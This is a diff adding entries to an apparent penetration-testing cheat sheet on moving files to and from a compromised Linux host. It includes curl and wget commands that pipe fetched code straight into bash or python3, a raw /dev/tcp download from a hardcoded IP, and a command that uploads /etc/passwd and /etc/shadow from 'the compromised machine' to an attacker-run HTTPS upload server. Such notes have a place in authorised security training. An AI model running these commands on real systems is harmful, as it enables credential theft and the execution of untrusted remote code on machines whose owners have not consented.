@@ -1,3 +1,64 @@
+###################################################################
+########################### Download ##############################
+###################################################################
+# Command: wget
+wget <URL> -O <output_file>
+
+# execute directly using a pipe (fileless download using wget)
+wget -qO- <URL> | python3
+
+# Command: curl
+curl -o <output_file> <URL>
+
+# execute directly using a pipe (fileless download using curl)
+curl <URL> | bash
+
+# Command: download using bash
+# connect to the target webserver
+exec 3<>/dev/tcp/10.10.10.32/80
+
+# HTTP Get Request
+echo -e "GET /file.sh HTTP/1.1\n\n">&3
+
+# print the response
+cat <&3
+
+# Command: ssh
+scp <user>@<URL>:<path_to_file>
+
+###################################################################
+########################### Upload##############################
+###################################################################
+
+# Command: using the uploadserver module to use HTTPS
+# Start web server
+sudo python3 -m pip install --user uploadserver
+
+# we need to create a certificate (here, self-signed)
+openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
+
+# start web server
+mkdir https && cd https
+
+# sudo python3 -m uploadserver 443 --server-certificate ~/server.pem
+
+# now, upload from the compromised machine /etc/passwd and /etc/shadow
+curl -X post https://<URL>/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
+
+
+###################################################################
+########################### FIND A TITLE ##########################
+###################################################################
+
+# enable ssh server
+sudo systemctl enable ssh
+
+# start ssh server
+sudo systemctl start ssh
+
+# checking for ssh listening port
+netstat -lnpt
+
 # start apache web server
 sudo systemctl start apache2
 
